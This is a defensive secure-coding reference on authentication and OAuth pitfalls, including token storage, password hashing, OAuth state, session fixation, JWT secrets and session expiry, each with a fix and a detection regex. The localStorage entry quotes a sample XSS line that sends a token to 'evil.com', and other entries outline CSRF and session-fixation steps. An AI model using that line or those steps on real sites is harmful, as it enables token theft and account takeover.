# Authentication Oauth - Sharp Edges

## Jwt In Localstorage

### **Id**
jwt-in-localstorage
### **Summary**
Storing JWT tokens in localStorage exposes them to XSS attacks
### **Severity**
critical
### **Situation**
  You implement JWT auth. You store the token in localStorage because it's
  easy. Any XSS vulnerability now allows attackers to steal tokens and
  impersonate users indefinitely.
  
### **Why**
  localStorage is accessible via JavaScript. XSS attack = token theft:
  - Attacker injects: fetch('evil.com?token=' + localStorage.getItem('token'))
  - Token exfiltrated
  - Attacker has full access until token expires
  - No way to detect or revoke stolen token
  
  Unlike cookies, localStorage:
  - Has no httpOnly protection
  - Has no expiry mechanism
  - Persists across tabs and restarts
  
### **Solution**
  Different strategies by token type:
  
  // Access tokens: Store in memory (JavaScript variable)
  let accessToken = null;
  
  async function login(credentials) {
    const response = await fetch('/auth/login', {...});
    const { accessToken: token } = await response.json();
    accessToken = token;  // Memory only, lost on refresh
  }
  
  // Refresh tokens: HttpOnly cookie (set by server)
  res.cookie('refreshToken', token, {
    httpOnly: true,    // No JS access
    secure: true,      // HTTPS only
    sameSite: 'strict', // CSRF protection
    path: '/auth',      // Limited scope
  });
  
  // On page load, use refresh endpoint to get new access token
  async function initAuth() {
    const response = await fetch('/auth/refresh', {
      credentials: 'include'  // Send cookies
    });
    if (response.ok) {
      const { accessToken: token } = await response.json();
      accessToken = token;
    }
  }
  
### **Symptoms**
  - localStorage.setItem('token')
  - localStorage.getItem('token')
  - XSS leads to account takeover
  - Tokens visible in DevTools > Application
### **Detection Pattern**
localStorage\\.(set|get)Item.*token|localStorage.*jwt

## No Password Hashing

### **Id**
no-password-hashing
### **Summary**
Storing passwords in plaintext or with weak hashing
### **Severity**
critical
### **Situation**
  You store passwords directly in the database, or hash them with MD5/SHA1.
  Database breach exposes all user passwords.
  
### **Why**
  Plaintext = instant exposure.
  MD5/SHA1 = cracked in seconds with rainbow tables.
  Simple hash = no salt, same passwords have same hash.
  
  Users reuse passwords, so your breach affects their bank accounts,
  email, and other services.
  
### **Solution**
  Use bcrypt or Argon2 with proper cost factor:
  
  import bcrypt from 'bcrypt';
  
  // Hash on registration - cost 12 = ~250ms on modern hardware
  const SALT_ROUNDS = 12;
  
  async function hashPassword(password: string): Promise<string> {
    return bcrypt.hash(password, SALT_ROUNDS);
  }
  
  // Verify on login
  async function verifyPassword(password: string, hash: string): Promise<boolean> {
    return bcrypt.compare(password, hash);
  }
  
  // Argon2 alternative (more memory-hard)
  import argon2 from 'argon2';
  
  const hash = await argon2.hash(password, {
    type: argon2.argon2id,  // Recommended variant
    memoryCost: 65536,      // 64 MB
    timeCost: 3,            // 3 iterations
    parallelism: 4,         // 4 threads
  });
  
  const valid = await argon2.verify(hash, password);
  
  // NEVER use these for passwords:
  // - MD5, SHA1, SHA256 (too fast, no salt)
  // - Encryption (reversible)
  // - Base64 (encoding, not hashing)
  
### **Symptoms**
  - Passwords visible in database
  - MD5/SHA in password code
  - "Forgot password" emails contain actual password
### **Detection Pattern**
md5\\(|sha1\\(|sha256\\(.*password|password.*=.*password

## No Oauth State Validation

### **Id**
no-oauth-state-validation
### **Summary**
OAuth flow without state parameter allows CSRF attacks
### **Severity**
critical
### **Situation**
  You implement OAuth login. You skip the state parameter because "it works
  without it". Attacker can CSRF the callback to link their OAuth account
  to victim's session.
  
### **Why**
  Without state validation:
  1. Attacker starts OAuth flow, gets callback URL with code
  2. Attacker sends callback URL to victim (link in email, hidden iframe)
  3. Victim clicks/loads URL while logged in
  4. Victim's account now linked to attacker's Google/GitHub
  5. Attacker logs in via OAuth, has access to victim's account
  
### **Solution**
  Always use state parameter:
  
  app.get('/auth/google', (req, res) => {
    // Generate random state
    const state = crypto.randomBytes(32).toString('hex');
  
    // Store in session
    req.session.oauthState = state;
  
    const authUrl = new URL('https://accounts.google.com/o/oauth2/auth');
    authUrl.searchParams.set('state', state);
    // ... other params
  
    res.redirect(authUrl);
  });
  
  app.get('/auth/callback', (req, res) => {
    // Validate state FIRST
    if (req.query.state !== req.session.oauthState) {
      return res.status(403).send('Invalid state parameter');
    }
  
    // Clear used state
    delete req.session.oauthState;
  
    // Continue with code exchange...
  });
  
  // Even better: Use PKCE too
  // state protects against CSRF
  // PKCE protects against code interception
  
### **Symptoms**
  - OAuth callback without state check
  - State parameter not in auth URL
  - Account takeover via OAuth linking
### **Detection Pattern**
oauth.*callback(?![\\s\\S]{0,200}state)|authorize\\?(?![\\s\\S]{0,100}state=)

## Session Fixation

### **Id**
session-fixation
### **Summary**
Not regenerating session ID after login allows session fixation
### **Severity**
critical
### **Situation**
  User logs in. You don't regenerate the session ID. Attacker who set
  the session ID before login now shares the authenticated session.
  
### **Why**
  Session fixation attack:
  1. Attacker visits site, gets session ID: abc123
  2. Attacker crafts URL or sets cookie on victim: sessionId=abc123
  3. Victim clicks link, uses session abc123 (unauthenticated)
  4. Victim logs in, session abc123 is now authenticated
  5. Attacker uses abc123, is now authenticated as victim
  
### **Solution**
  Regenerate session on privilege change:
  
  app.post('/login', async (req, res) => {
    const user = await authenticateUser(req.body);
  
    // CRITICAL: Regenerate session
    req.session.regenerate((err) => {
      if (err) {
        return res.status(500).send('Session error');
      }
  
      // Now safe to store user info
      req.session.userId = user.id;
      req.session.loginTime = Date.now();
  
      res.json({ success: true });
    });
  });
  
  // Also regenerate on:
  // - Password change
  // - Privilege elevation (admin mode)
  // - Sensitive operations
  
### **Symptoms**
  - Login without session.regenerate()
  - Same session ID before and after login
  - Shared session attacks
### **Detection Pattern**
session\\.userId\\s*=(?![\\s\\S]{0,100}regenerate)

## Weak Jwt Secret

### **Id**
weak-jwt-secret
### **Summary**
Using weak or hardcoded JWT secret allows token forgery
### **Severity**
high
### **Situation**
  You use a simple string like "secret" or hardcode the JWT secret
  in your code. Attacker can brute force or find it, then forge
  any user's token.
  
### **Why**
  Weak secrets can be cracked:
  - "secret" = cracked in milliseconds
  - Short secrets = brute force feasible
  - Hardcoded = found in code, git history, decompiled apps
  
  Once known, attacker can create tokens for any user.
  
### **Solution**
  Generate strong, random secrets:
  
  // Generate 256-bit secret
  const secret = crypto.randomBytes(32).toString('base64');
  // Store in environment variable, never in code
  
  // .env (never commit)
  JWT_SECRET=kT8XpZr3nM9yQ2vH...  # 256+ bits
  
  // Use in code
  jwt.sign(payload, process.env.JWT_SECRET);
  
  // For RS256 (asymmetric), use proper key pair:
  // - Private key signs (keep secret)
  // - Public key verifies (can be shared)
  
  // Rotate secrets periodically
  // Support multiple secrets during rotation:
  const secrets = [
    process.env.JWT_SECRET_CURRENT,
    process.env.JWT_SECRET_PREVIOUS,  // Still valid during rotation
  ];
  
### **Symptoms**
  - Hardcoded "secret" or "password" for JWT
  - Short JWT secret
  - Secret in git repository
### **Detection Pattern**
jwt\.sign\([^)]+['"]\w{1,20}['"]|secret.*=.*['"]\w{1,20}['"]

## No Refresh Token Rotation

### **Id**
no-refresh-token-rotation
### **Summary**
Refresh tokens that can be reused indefinitely
### **Severity**
high
### **Situation**
  You implement refresh tokens. Each refresh token can be used multiple
  times. If stolen, attacker has indefinite access and you can't detect it.
  
### **Why**
  Without rotation:
  - Stolen token works until expiry (could be weeks)
  - Legitimate user and attacker can both use it
  - No way to detect compromise
  - Can't revoke specific token
  
### **Solution**
  Implement refresh token rotation:
  
  async function refreshTokens(oldRefreshToken: string) {
    // Validate old token
    const payload = jwt.verify(oldRefreshToken, JWT_REFRESH_SECRET);
  
    // Check if token exists and not already used
    const tokenRecord = await db.refreshToken.findFirst({
      where: {
        tokenHash: hash(oldRefreshToken),
        usedAt: null,
      }
    });
  
    if (!tokenRecord) {
      // Token reuse detected - possible theft
      // Revoke ALL tokens in this family
      await db.refreshToken.updateMany({
        where: { tokenFamily: payload.family },
        data: { revokedAt: new Date() }
      });
      throw new Error('Token reuse detected');
    }
  
    // Mark old token as used
    await db.refreshToken.update({
      where: { id: tokenRecord.id },
      data: { usedAt: new Date() }
    });
  
    // Issue new token pair with same family
    return generateTokens(payload.sub, payload.family);
  }
  
### **Symptoms**
  - Refresh tokens work multiple times
  - No token_use tracking
  - Can't detect stolen tokens
### **Detection Pattern**
refreshToken(?![\\s\\S]{0,300}rotate|revoke|used)

## Timing Attack Password

### **Id**
timing-attack-password
### **Summary**
Password comparison that leaks timing information
### **Severity**
high
### **Situation**
  Your login checks if user exists first, then compares password.
  Attacker can distinguish "user doesn't exist" from "wrong password"
  by response time difference.
  
### **Why**
  Timing differences leak information:
  - User not found: Fast response (no password check)
  - Wrong password: Slow response (bcrypt comparison)
  
  Attacker can enumerate valid usernames, then focus password attacks.
  
### **Solution**
  Make timing consistent:
  
  async function login(email: string, password: string) {
    const user = await db.user.findUnique({
      where: { email: email.toLowerCase() }
    });
  
    // ALWAYS do password comparison, even if user doesn't exist
    const hash = user?.passwordHash ?? DUMMY_HASH;
    const valid = await bcrypt.compare(password, hash);
  
    // Same error for both cases
    if (!user || !valid) {
      throw new Error('Invalid credentials');  // Generic message
    }
  
    return user;
  }
  
  // Pre-compute a dummy hash to use when user doesn't exist
  // This ensures consistent timing
  const DUMMY_HASH = bcrypt.hashSync('dummy', 12);
  
### **Symptoms**
  - Different error messages for user not found vs wrong password
  - No password check when user not found
  - Response time varies based on user existence
### **Detection Pattern**
user.*not.*found|user.*null.*return|!user.*throw

## No Mfa Option

### **Id**
no-mfa-option
### **Summary**
No multi-factor authentication for sensitive accounts
### **Severity**
medium
### **Situation**
  Your app handles sensitive data (financial, health, personal).
  You only offer password authentication. Password compromise = full
  account compromise.
  
### **Why**
  Passwords alone are insufficient:
  - Users reuse passwords
  - Phishing is effective
  - Password databases get breached
  - Credential stuffing attacks
  
  MFA adds second factor attacker must also compromise.
  
### **Solution**
  Implement TOTP-based MFA:
  
  import { authenticator } from 'otplib';
  
  // Setup: Generate secret and QR code
  async function enableMFA(userId: string) {
    const secret = authenticator.generateSecret();
    const user = await db.user.findUnique({ where: { id: userId } });
  
    const otpauth = authenticator.keyuri(user.email, 'MyApp', secret);
  
    await db.user.update({
      where: { id: userId },
      data: {
        mfaSecret: encrypt(secret),
        mfaPending: true,  // Not enabled until verified
      }
    });
  
    return { otpauth, secret };
  }
  
  // Verify MFA code on login
  async function verifyMFA(userId: string, code: string) {
    const user = await db.user.findUnique({ where: { id: userId } });
    const secret = decrypt(user.mfaSecret);
  
    return authenticator.verify({ token: code, secret });
  }
  
### **Symptoms**
  - Sensitive app with password-only auth
  - No MFA in security settings
  - Single point of authentication failure
### **Detection Pattern**
password.*only|no.*mfa|single.*factor

## No Password Strength

### **Id**
no-password-strength
### **Summary**
Accepting weak passwords that are easily cracked
### **Severity**
medium
### **Situation**
  Users can set passwords like "123456" or "password". These are
  cracked instantly in any breach.
  
### **Why**
  Common passwords are:
  - In every cracking dictionary
  - Cracked in milliseconds
  - Provide false sense of security
  
  Top 10 passwords are used by millions of people.
  
### **Solution**
  Enforce password requirements:
  
  import zxcvbn from 'zxcvbn';  // Dropbox password strength checker
  
  function validatePassword(password: string, userInfo: string[]) {
    // Minimum length
    if (password.length < 12) {
      throw new Error('Password must be at least 12 characters');
    }
  
    // Check strength with zxcvbn
    const result = zxcvbn(password, userInfo);  // Include email, name
  
    if (result.score < 3) {  // 0-4 scale
      throw new Error(result.feedback.warning || 'Password too weak');
    }
  
    // Check against breached passwords (optional but recommended)
    const isPwned = await checkHaveIBeenPwned(password);
    if (isPwned) {
      throw new Error('This password has been exposed in data breaches');
    }
  
    return true;
  }
  
  // HaveIBeenPwned API (uses k-anonymity)
  async function checkHaveIBeenPwned(password: string) {
    const hash = crypto.createHash('sha1').update(password).digest('hex').toUpperCase();
    const prefix = hash.slice(0, 5);
    const suffix = hash.slice(5);
  
    const response = await fetch(`https://api.pwnedpasswords.com/range/${prefix}`);
    const text = await response.text();
  
    return text.includes(suffix);
  }
  
### **Symptoms**
  - "123456" accepted as password
  - No password strength indicator
  - Breaches expose many simple passwords
### **Detection Pattern**
password\\.length.*>.*[1-7]\\b|minLength.*[1-7]\\b

## Session No Expiry

### **Id**
session-no-expiry
### **Summary**
Sessions that never expire keep users logged in forever
### **Severity**
medium
### **Situation**
  User logs in on public computer. They don't log out. Session stays
  valid indefinitely. Anyone using that computer has access.
  
### **Why**
  Long-lived sessions:
  - Increase window for session theft
  - Keep stale sessions active
  - Accumulate zombie sessions
  - No forced re-authentication
  
### **Solution**
  Implement session timeouts:
  
  // Absolute timeout: Maximum session duration
  const ABSOLUTE_TIMEOUT = 24 * 60 * 60 * 1000;  // 24 hours
  
  // Idle timeout: Inactivity timeout
  const IDLE_TIMEOUT = 30 * 60 * 1000;  // 30 minutes
  
  app.use((req, res, next) => {
    if (req.session.userId) {
      const now = Date.now();
  
      // Check absolute timeout
      if (now - req.session.loginTime > ABSOLUTE_TIMEOUT) {
        return req.session.destroy(() => {
          res.status(401).json({ error: 'Session expired' });
        });
      }
  
      // Check idle timeout
      if (now - req.session.lastActivity > IDLE_TIMEOUT) {
        return req.session.destroy(() => {
          res.status(401).json({ error: 'Session idle timeout' });
        });
      }
  
      // Update activity timestamp
      req.session.lastActivity = now;
    }
    next();
  });
  
### **Symptoms**
  - No session expiry logic
  - Users stay logged in for weeks
  - No "remember me" vs "session only" option
### **Detection Pattern**
session(?![\\s\\S]{0,200}expire|timeout|maxAge)